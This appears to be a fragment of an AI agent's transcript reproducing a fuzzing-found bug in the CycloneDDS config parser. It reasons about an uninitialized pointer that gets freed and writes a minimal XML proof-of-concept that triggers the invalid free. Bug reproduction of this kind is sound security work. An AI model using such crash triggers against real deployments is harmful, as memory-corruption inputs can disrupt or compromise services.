message:
Running command: cat > /workspace/poc.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8" ?>
<CycloneDDS xmlns="https://cdds.io/config" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="https://cdds.io/config https://raw.githubusercontent.com/eclipse-cyclonedds/cyclonedds/master/etc/cyclonedds.xsd">
    <Domain id="any">
        <Partitioning>
            <NetworkPartitions>
                <NetworkPartition name="p0">
                    <Address>192.168.1.1</Address>
                </NetworkPartition>
            </NetworkPartitions>
        </Partitioning>
    </Domain>
</CycloneDDS>
EOF
echo "PoC created" && cat /workspace/poc.xml

message.content:
`ddsi_config_fini` calls `free_all_elements` which will free all configured elements including the `Interface` attribute via `ff_free`. Since `interface_names` is uninitialized when the `Interface` attribute is not specified, `ff_free` will call `ddsrt_free` on garbage.

Now let me create the PoC. The config needs:
1. A `NetworkPartition` element (under `Partitioning/NetworkPartitions`)
2. Without the `Interface` attribute
3. The config must be valid enough to reach `ddsi_config_fini` (i.e., `ddsi_config_init` must succeed)

Let me check what's required for a valid network partition config. Looking at `check_nwpart_address_consistency`, each network partition needs at least some addresses. But that check happens in `convert_network_partition_config` which is called elsewhere (not in `ddsi_config_init`). Let me verify - the fuzz target only calls `ddsi_config_init` and `ddsi_config_fini`, not `convert_network_partition_config`. So the config just needs to parse successfully.

Let me create the PoC XML:
